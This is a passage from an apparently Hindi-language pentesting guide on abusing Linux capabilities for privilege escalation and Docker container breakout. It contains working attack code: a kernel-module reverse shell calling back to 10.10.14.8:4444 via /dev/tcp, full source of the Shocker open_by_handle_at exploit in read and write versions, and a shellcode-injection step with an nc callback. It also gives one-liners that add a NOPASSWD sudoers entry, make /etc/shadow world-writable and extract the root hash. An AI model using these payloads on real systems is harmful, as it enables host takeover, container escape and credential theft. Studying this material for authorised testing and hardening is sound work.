आप निष्पादित कमांड का आउटपुट नहीं देख पाएँगे, लेकिन वह उस process द्वारा निष्पादित होगी (इसलिए rev shell प्राप्त करें)।

> [!WARNING]
> यदि आपको "No symbol "system" in current context." त्रुटि मिलती है, तो gdb के माध्यम से किसी program में shellcode लोड करने वाला पिछला उदाहरण देखें।

**environment के साथ उदाहरण (Docker breakout) - Shellcode Injection**

आप Docker container के अंदर enabled capabilities को इस तरह जाँच सकते हैं:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```

**host** में चल रहे **processes** की सूची `ps -eaf`

1. **architecture** पता करें `uname -m`
2. उस architecture के लिए **shellcode** खोजें ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. किसी process की memory में **shellcode** **inject** करने के लिए **program** खोजें ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. program में **shellcode** को **modify** करें और उसे **compile** करें `gcc inject.c -o inject`
5. इसे **inject** करें और अपना **shell** प्राप्त करें: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** किसी process को **kernel modules को load और unload करने (`init_module(2)`, `finit_module(2)` और `delete_module(2)` system calls)** की अनुमति देता है, जिससे kernel के मुख्य operations तक सीधी पहुँच मिलती है। इस capability से गंभीर security risks पैदा होते हैं, क्योंकि module load करने से kernel का व्यवहार बदला जा सकता है और isolation boundaries को निष्प्रभावी किया जा सकता है।<sup>[[6]](#references)[[14]](#references)</sup>
एक सामान्य rootful Linux container में, यह **shared host kernel** को target करता है और इसलिए सीधे breakout का रास्ता बनता है। यह capability initial user namespace में effective होनी चाहिए, क्योंकि modules load करने की प्रक्रिया namespaced नहीं है। gVisor, Kata या Hyper-V जैसे userspace-kernel या VM-isolated runtime से यह बदल जाता है कि किस kernel boundary तक पहुँचा जा सकता है। फिर भी, `modules_disabled`, kernel lockdown, signature enforcement, seccomp या किसी LSM द्वारा modules को load करने से रोका जा सकता है।<sup>[[14]](#references)</sup>

**binary के साथ उदाहरण**

निम्नलिखित उदाहरण में binary **`python`** के पास यह capability है।

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```

डिफ़ॉल्ट रूप से, **`modprobe`** कमांड dependency list और map files को **`/lib/modules/$(uname -r)`** डायरेक्टरी में जाँचता है।\
इसका दुरुपयोग करने के लिए, एक fake **lib/modules** फ़ोल्डर बनाएँ:

```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

फिर **नीचे दिए गए 2 उदाहरणों में से किसी kernel module को compile करके इस फ़ोल्डर में copy करें:**

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```

अंत में, इस kernel module को load करने के लिए आवश्यक python code चलाएँ:

```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```

**binary के साथ उदाहरण 2**

निम्नलिखित उदाहरण में binary **`kmod`** में यह capability है।

```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

जिसका मतलब है कि kernel module insert करने के लिए **`insmod`** command का इस्तेमाल किया जा सकता है। इस privilege का दुरुपयोग करके **reverse shell** पाने के लिए नीचे दिए गए उदाहरण का पालन करें।

**environment के साथ उदाहरण (Docker breakout)**

आप docker container के अंदर enabled capabilities को इस command से check कर सकते हैं:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

पिछले आउटपुट में आप देख सकते हैं कि **SYS_MODULE** capability enabled है।<sup>[[14]](#references)</sup>

एक **kernel module** **बनाएँ** जो reverse shell execute करेगा, और इसे **compile** करने के लिए **Makefile** बनाएँ:

```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

> [!WARNING]
> Makefile में हर make शब्द से पहले का खाली अक्षर **स्पेस नहीं, टैब होना चाहिए**!

इसे compile करने के लिए `make` चलाएँ।

```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```

अंत में, एक shell के अंदर `nc` शुरू करें और किसी दूसरे shell से **module लोड करें**; इससे nc process में shell capture हो जाएगी:

```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```

**इस technique का code "Abusing SYS_MODULE Capability" की laboratory से कॉपी किया गया था** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

इस technique का एक और उदाहरण [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) पर मिल सकता है।

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) किसी process को **files पढ़ने और directories पढ़ने तथा execute करने की permissions को bypass करने** की अनुमति देता है। यह `open_by_handle_at(2)` को भी authorize करता है, जो उसी mounted filesystem के mount file descriptor के सापेक्ष एक valid file handle को समझता है। यह process के mount namespace के बाहर मौजूद हर file को अपने-आप उपलब्ध नहीं कराता। File-handle breakout के लिए host से संबंधित filesystem reference, valid या खोजे जा सकने वाले handles, compatible filesystem और storage layout, तथा runtime या LSM की ओर से कोई रोक न होना भी ज़रूरी है। प्रभावित layouts में ऐतिहासिक Docker "Shocker" technique ने ऐसा combination दिखाया था, जिसका विश्लेषण [यहाँ](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) किया गया है।<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
**इसका मतलब है कि आप file पढ़ने की permission checks और directory पढ़ने/execute करने की permission checks को bypass कर सकते हैं**।<sup>[[14]](#references)</sup>

इस capability वाले **custom executable** के लिए, जाँचें कि यह क्या पढ़ता है और अपने caller को क्या लौटाता है। ऐसा file-scanning helper, जो caller द्वारा चुने गए protected pathname और prefix length को स्वीकार करता है, फिर उस prefix का पूरा digest दिखाता है, file-read oracle की तरह काम कर सकता है: पहले `n-1` bytes हासिल करने के बाद, हर संभावित अगले byte के लिए candidate digests की तुलना length `n` के लिए helper के digest से करें। यह किसी cryptographic collision या खास तौर पर MD5 खोजने पर निर्भर नहीं करता; यह बार-बार चुनी गई length के साथ query करने और visible, deterministic digests पर निर्भर करता है। बिना prefix control वाला whole-file digest ऐसा रास्ता साबित नहीं करता। पुष्टि करें कि caller helper execute कर सकता है, उसकी file capability effective हो जाती है, चुना हुआ path उसके mount namespace में accessible है, और input/output behavior वास्तव में मौजूद है। Passive enumeration के दौरान जाँच करने के लिए किसी अज्ञात privileged helper को न चलाएँ।

**Binary का उदाहरण**

यह binary अपने namespaces में accessible files पढ़ सकता है। इसलिए, अगर `tar` जैसी किसी file में यह capability है, तो यह shadow file पढ़ सकता है:

```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```

**binary2 के साथ उदाहरण**

इस मामले में मान लें कि **`python`** binary में यह capability है। root फ़ाइलों की सूची देखने के लिए आप यह कर सकते हैं:

```python
import os
for r, d, f in os.walk('/root'):
    for filename in f:
        print(filename)
```

और किसी फ़ाइल को पढ़ने के लिए आप यह कर सकते हैं:

```python
print(open("/etc/shadow", "r").read())
```

**पर्यावरण में उदाहरण (Docker breakout)**

आप `capsh --print` का उपयोग करके Docker container में enabled capabilities देख सकते हैं।<sup>[[14]](#references)[[26]](#references)</sup>

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

पिछले आउटपुट में आप देख सकते हैं कि **DAC_READ_SEARCH** capability enabled है। यह DAC read/search checks को bypass करती है और `open_by_handle_at(2)` की अनुमति देती है; यह अपने आप में process-debugging capability नहीं है।<sup>[[14]](#references)</sup>

आप [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) में जान सकते हैं कि निम्न exploit कैसे काम करता है। संक्षेप में, **CAP_DAC_READ_SEARCH** बिना permission checks के file system में आगे बढ़ने देती है और `open_by_handle_at(2)` की अनुमति देती है; जब संबंधित namespaces और mounts तक पहुँचा जा सकता हो, तो इससे दूसरी processes द्वारा खोली गई files उजागर हो सकती हैं।<sup>[[13]](#references)[[14]](#references)</sup>

इन permissions का दुरुपयोग करके host से files पढ़ने वाला मूल exploit यहाँ है: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); आगे इसका **modified version दिया गया है, जिसमें पढ़ी जाने वाली file को पहले argument के रूप में दिया जा सकता है और परिणाम को file में dump किया जा सकता है**।<sup>[[12]](#references)</sup>

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
    h->handle_type);
    for (int i = 0; i < h->handle_bytes; ++i) {
        fprintf(stderr,"0x%02x", h->f_handle[i]);
        if ((i + 1) % 20 == 0)
        fprintf(stderr,"\n");
        if (i < h->handle_bytes - 1)
        fprintf(stderr,", ");
    }
    fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
    };
    DIR *dir = NULL;
    struct dirent *de = NULL;
    path = strchr(path, '/');
    // recursion stops if path has been resolved
    if (!path) {
        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
        oh->handle_type = 1;
        oh->handle_bytes = 8;
        return 1;
    }

    ++path;
    fprintf(stderr, "[*] Resolving '%s'\n", path);
    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
        die("[-] open_by_handle_at");
    if ((dir = fdopendir(fd)) == NULL)
        die("[-] fdopendir");
    for (;;) {
        de = readdir(dir);
        if (!de)
        break;
        fprintf(stderr, "[*] Found %s\n", de->d_name);
        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
            fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
            ino = de->d_ino;
            break;
        }
    }

    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
    if (de) {
        for (uint32_t i = 0; i < 0xffffffff; ++i) {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            memcpy(outh.f_handle, &ino, sizeof(ino));
            memcpy(outh.f_handle + 4, &i, sizeof(i));
            if ((i % (1<<20)) == 0)
                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                closedir(dir);
                close(fd);
                dump_handle(&outh);
                return find_handle(bfd, path, &outh, oh);
            }
        }
    }
    closedir(dir);
    close(fd);
    return 0;
}


int main(int argc,char* argv[] )
{
    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
    };

    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

    read(0, buf, 1);

    // get a FS reference from something mounted in from outside
    if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
        die("[-] open");

    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");

    fprintf(stderr, "[!] Got a final handle!\n");
    dump_handle(&h);

    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
        die("[-] open_by_handle");

    memset(buf, 0, sizeof(buf));
    if (read(fd2, buf, sizeof(buf) - 1) < 0)
        die("[-] read");

    printf("Success!!\n");

    FILE *fptr;
    fptr = fopen(argv[2], "w");
    fprintf(fptr,"%s", buf);
    fclose(fptr);

    close(fd2); close(fd1);

    return 0;
}
```

> [!WARNING]
> exploit को host पर mount की गई किसी चीज़ का pointer ढूँढ़ना होगा। मूल exploit में `/.dockerinit` फ़ाइल का इस्तेमाल किया गया था और इस modified version में `/etc/hostname` का इस्तेमाल होता है। अगर exploit काम नहीं कर रहा है, तो शायद आपको कोई दूसरी फ़ाइल सेट करनी होगी। Host पर mount की गई फ़ाइल ढूँढ़ने के लिए `mount` command चलाएँ:

![CAP SYS MODULE - CAP DAC READ SEARCH: exploit को host पर mount की गई किसी चीज़ का pointer ढूँढ़ना होगा। मूल exploit में /.dockerinit फ़ाइल का इस्तेमाल किया गया था और इस modified version में...](<../../images/image (407) (1).png>)

**इस technique का code "Abusing DAC_READ_SEARCH Capability" की laboratory से copy किया गया था:** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**यह capability फ़ाइलों को पढ़ने और लिखने की permission जाँचों तथा ज़्यादातर execute जाँचों को bypass करती है**; किसी regular file को execute करने के लिए अब भी कम-से-कम एक execute bit सेट होना ज़रूरी है। यह read-only mount, immutable state या LSM denial को bypass नहीं करती।<sup>[[14]](#references)</sup>

ऐसी फ़ाइलें ढूँढ़ें जो किसी privileged group की membership के ज़रिए readable या writable हो जाती हैं; उपयोगी targets, target के ownership और mode bits पर निर्भर करते हैं।<sup>[[14]](#references)</sup>

**binary का उदाहरण**

इस उदाहरण में vim के पास यह capability है, इसलिए आप _passwd_, _sudoers_ या _shadow_ जैसी कोई भी फ़ाइल modify कर सकते हैं:

```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```

**Binary 2 के साथ उदाहरण**

इस उदाहरण में **`python`** binary के पास यह capability होगी। आप किसी भी file को overwrite करने के लिए python का उपयोग कर सकते हैं:

```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```

**environment + CAP_DAC_READ_SEARCH के साथ उदाहरण (Docker breakout)**

`CAP_DAC_READ_SEARCH` `open_by_handle_at(2)` की अनुमति देता है, लेकिन write permission checks को **bypass** नहीं करता। Resolved handle के ज़रिए लिखने के लिए, इसके अतिरिक्त process के effective filesystem UID/GID या ACL के अनुसार write access, या `CAP_DAC_OVERRIDE` की आवश्यकता होती है। Host से संबंधित filesystem reference, supported file handles, writable mount, और runtime/LSM policy को भी इस operation की अनुमति देनी होगी। Effective capabilities और identity जाँचें; अकेले किसी भी capability से यह साबित नहीं होता कि host पर कोई target writable है। [capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html) और [open_by_handle_at(2)](https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html) देखें।<sup>[[14]](#references)[[26]](#references)</sup>

सबसे पहले, पिछले section को पढ़ें जो host की [**arbitrary files पढ़ने के लिए DAC_READ_SEARCH capability का दुरुपयोग करता है**](linux-capabilities.md#cap_dac_read_search), और exploit को **compile** करें।\
नीचे दिया गया historical sample, resolved file को `O_RDWR` के साथ खोलने की कोशिश करता है; यह तभी सफल होता है जब ऊपर बताई गई filesystem और write-permission संबंधी शर्तें पूरी हों:

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
  unsigned int handle_bytes;
  int handle_type;
  unsigned char f_handle[8];
};
void die(const char * msg) {
  perror(msg);
  exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
    h -> handle_type);
  for (int i = 0; i < h -> handle_bytes; ++i) {
    fprintf(stderr, "0x%02x", h -> f_handle[i]);
    if ((i + 1) % 20 == 0)
      fprintf(stderr, "\n");
    if (i < h -> handle_bytes - 1)
      fprintf(stderr, ", ");
  }
  fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
  int fd;
  uint32_t ino = 0;
  struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
  };
  DIR * dir = NULL;
  struct dirent * de = NULL;
  path = strchr(path, '/');
  // recursion stops if path has been resolved
  if (!path) {
    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
    oh -> handle_type = 1;
    oh -> handle_bytes = 8;
    return 1;
  }
  ++path;
  fprintf(stderr, "[*] Resolving '%s'\n", path);
  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
    die("[-] open_by_handle_at");
  if ((dir = fdopendir(fd)) == NULL)
    die("[-] fdopendir");
  for (;;) {
    de = readdir(dir);
    if (!de)
      break;
    fprintf(stderr, "[*] Found %s\n", de -> d_name);
    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
      ino = de -> d_ino;
      break;
    }
  }
  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
  if (de) {
    for (uint32_t i = 0; i < 0xffffffff; ++i) {
      outh.handle_bytes = 8;
      outh.handle_type = 1;
      memcpy(outh.f_handle, & ino, sizeof(ino));
      memcpy(outh.f_handle + 4, & i, sizeof(i));
      if ((i % (1 << 20)) == 0)
        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
        closedir(dir);
        close(fd);
        dump_handle( & outh);
        return find_handle(bfd, path, & outh, oh);
      }
    }
  }
  closedir(dir);
  close(fd);
  return 0;
}
int main(int argc, char * argv[]) {
  char buf[0x1000];
  int fd1, fd2;
  struct my_file_handle h;
  struct my_file_handle root_h = {
    .handle_bytes = 8,
    .handle_type = 1,
    .f_handle = {
      0x02,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    }
  };
  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
  read(0, buf, 1);
  // get a FS reference from something mounted in from outside
  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
    die("[-] open");
  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
    die("[-] Cannot find valid handle!");
  fprintf(stderr, "[!] Got a final handle!\n");
  dump_handle( & h);
  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
    die("[-] open_by_handle");
  char * line = NULL;
  size_t len = 0;
  FILE * fptr;
  ssize_t read;
  fptr = fopen(argv[2], "r");
  while ((read = getline( & line, & len, fptr)) != -1) {
    write(fd2, line, read);
  }
  printf("Success!!\n");
  close(fd2);
  close(fd1);
  return 0;
}
```

Docker container से **escape** करने के लिए, आप host से `/etc/shadow` और `/etc/passwd` फ़ाइलें **download** कर सकते हैं, उनमें एक **नया user जोड़** सकते हैं और उन्हें overwrite करने के लिए **`shocker_write`** का उपयोग कर सकते हैं। फिर **ssh** के ज़रिए **access** करें।

**इस technique का code, "Abusing DAC_OVERRIDE Capability" प्रयोगशाला से कॉपी किया गया था, जो** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) **पर उपलब्ध है।**<sup>[[1]](#references)</sup>

## CAP_CHOWN

**यह capability किसी process को फ़ाइलों का ownership बदलने की अनुमति देती है।**<sup>[[14]](#references)</sup>

**binary के साथ उदाहरण**

मान लें कि **`python`** binary के पास यह capability है; आप **`shadow`** जैसी फ़ाइल का owner बदल सकते हैं, फिर अन्य permissions अनुमति दें तो उस access का उपयोग करके इसे modify कर सकते हैं:

```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

या **`ruby`** binary के पास यह capability होने पर:

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

## CAP_FOWNER

**यह capability कई file operations के लिए ownership checks को bypass करती है, जिनमें permissions बदलना भी शामिल है**।<sup>[[14]](#references)</sup>

**binary के साथ उदाहरण**

यदि python में यह capability है, तो आप shadow file की permissions बदल सकते हैं, **root password बदल सकते हैं**, और privileges escalate कर सकते हैं:

```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```

### CAP_SETUID

**यह capability किसी process को kernel द्वारा लागू credential और capability नियमों के अधीन, अपना effective user ID बदलने की अनुमति देती है**।<sup>[[14]](#references)</sup>

**binary के साथ उदाहरण**

अगर python के पास यह **capability** है, तो आप इसका बहुत आसानी से दुरुपयोग करके root तक privileges escalate कर सकते हैं:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**एक और तरीका:**

```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```

एक **custom** executable के लिए जिसमें effective `CAP_SETUID` है, केवल यह मानने के बजाय कि capability से shell मिल जाएगा, reachable code path की जाँच करें। [`printf`](https://man7.org/linux/man-pages/man3/printf.3.html) को *format string* के रूप में दिया गया caller-controlled text process memory को उजागर या बदल सकता है; उपयोगी privilege transition फिर भी एक vulnerable call, controllable input और `setuid(0)` के बाद होने वाली कार्रवाई पर निर्भर करता है। यदि वह कार्रवाई किसी external helper को नाम से launch करती है, तो launch के समय effective identity, वास्तविक `PATH`, और क्या पहले खोजी जाने वाली कोई directory caller के लिए writable और traversable है—इन सबकी जाँच करें। अप्रभावी file capability, `no_new_privs`, fixed trusted helper path, या unreachable branch से नतीजा बदल जाता है। Binary या उपलब्ध source की offline समीक्षा करें; routine enumeration के दौरान किसी संदिग्ध privileged helper को invoke न करें।

## CAP_SETGID

**यह capability process को अपना effective group ID बदलने देती है, kernel द्वारा लागू credential और capability नियमों के अधीन**।<sup>[[14]](#references)</sup>

ऐसी बहुत-सी files हैं जिन्हें आप **privileges escalate करने के लिए overwrite कर सकते हैं;** [**आप यहाँ से विचार ले सकते हैं**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)।

**Binary का उदाहरण**

इस मामले में आपको उन रोचक files की तलाश करनी चाहिए जिन्हें कोई group पढ़ सकता है, क्योंकि आप किसी भी group का रूप धारण कर सकते हैं:

```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

एक ऐसी फ़ाइल खोज लेने के बाद जिसका विशेषाधिकार बढ़ाने के लिए (पढ़कर या लिखकर) दुरुपयोग किया जा सकता है, आप **रोचक समूह का रूप धारण करके shell प्राप्त कर सकते हैं**:

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

इस मामले में `shadow` group का प्रतिरूपण किया गया था, इसलिए आप फ़ाइल `/etc/shadow` पढ़ सकते हैं:

```bash
cat /etc/shadow
```

### संयुक्त chain: CAP_SETGID + CAP_CHOWN

जब दोनों capabilities एक ही helper में उपलब्ध हों, तो एक व्यावहारिक chain यह है:

1. EGID को `shadow` (या किसी अन्य privileged group) पर स्विच करें।
2. `/etc/shadow` पर `chown` का उपयोग करके group `shadow` को बनाए रखते हुए अपना UID सेट करें।
3. target hash पढ़ें और crack/pivot करें।

```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```

इससे सीधे पूर्ण root की आवश्यकता नहीं पड़ती और credential reuse के ज़रिए pivot करने के लिए यह आमतौर पर पर्याप्त होता है।

अगर **docker** इंस्टॉल है, तो आप **docker group** का **impersonate** कर सकते हैं और [**docker socket** से communicate करके privileges escalate](#writable-docker-socket) कर सकते हैं।

## CAP_SETFCAP

**यह capability किसी process को file capabilities सेट करने की अनुमति देती है**।<sup>[[14]](#references)</sup>

**binary के साथ उदाहरण**

अगर python में यह **capability** है, तो आप root तक privileges escalate करने के लिए इसका बहुत आसानी से दुरुपयोग कर सकते हैं:

```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
    print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```

> [!WARNING]
> नई लिखी गई file capability set, पिछले set की जगह ले लेती है; यदि इसके बाद helper को केवल नई capabilities के साथ execute किया जाता है, तो संभव है कि वह किसी दूसरी file को update करने के लिए `CAP_SETFCAP` अपने पास न रखे।<sup>[[14]](#references)[[25]](#references)</sup>

एक बार आपके पास [SETUID capability](linux-capabilities.md#cap_setuid) हो जाए, तो privileges escalate करने का तरीका देखने के लिए उसके section पर जा सकते हैं।

**environment के साथ उदाहरण (Docker breakout)**

Docker के documented default capability set में **CAP_SETFCAP** शामिल है, लेकिन वास्तविक set runtime configuration पर निर्भर करता है।<sup>[[19]](#references)</sup>
आप process capabilities को इस तरह inspect कर सकते हैं:

```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
